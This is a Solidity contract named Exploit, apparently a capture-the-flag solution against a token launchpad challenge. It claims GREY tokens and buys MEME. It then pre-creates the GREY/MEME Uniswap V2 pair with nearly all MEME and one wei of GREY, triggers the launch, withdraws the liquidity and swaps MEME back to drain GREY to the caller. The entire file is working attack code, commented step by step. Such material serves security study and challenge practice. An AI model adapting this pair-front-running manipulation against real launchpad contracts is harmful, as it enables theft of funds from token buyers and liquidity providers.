// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Setup } from "src/launchpad/Setup.sol";
import { UniswapV2Pair } from "src/launchpad/lib/v2-core/UniswapV2Pair.sol";

contract Exploit {
    Setup setup;

    constructor(Setup _setup) {
        setup = _setup;
    }

    function solve() external {
        // Claim 5e18 GREY
        setup.claim();
        
        // Addresses
        address greyAddress = address(setup.grey());
        address memeAddress = address(setup.meme());
        address factoryAddress = address(setup.factory());

        // Buy 5e18 - 1 GREY worth of MEME
        setup.grey().approve(factoryAddress, 5e18 - 1);
        uint256 tokenAmount = setup.factory().buyTokens(memeAddress, 5e18 - 1, 0);

        // Create GREY <> MEME pair on Uniswap
        address pair = setup.uniswapV2Factory().createPair(greyAddress, memeAddress);

        // Mint liquidity in UniswapV2 pair with all MEME and 1 wei of GREY
        setup.meme().transfer(pair, tokenAmount);
        setup.grey().transfer(pair, 1);
        uint256 liquidity = UniswapV2Pair(pair).mint(address(this));

        // Launch MEME to Uniswap
        setup.factory().launchToken(memeAddress);

        // Withdraw all liquidity from UniswapV2 pair
        UniswapV2Pair(pair).transfer(pair, liquidity);
        UniswapV2Pair(pair).burn(address(this));

        // Swap all MEME for GREY
        setup.meme().transfer(pair, setup.meme().balanceOf(address(this)));
        UniswapV2Pair(pair).swap(0, 1.65e18, address(this), "");

        // Send all GREY to msg.sender
        setup.grey().transfer(msg.sender, setup.grey().balanceOf(address(this)));
    }
}
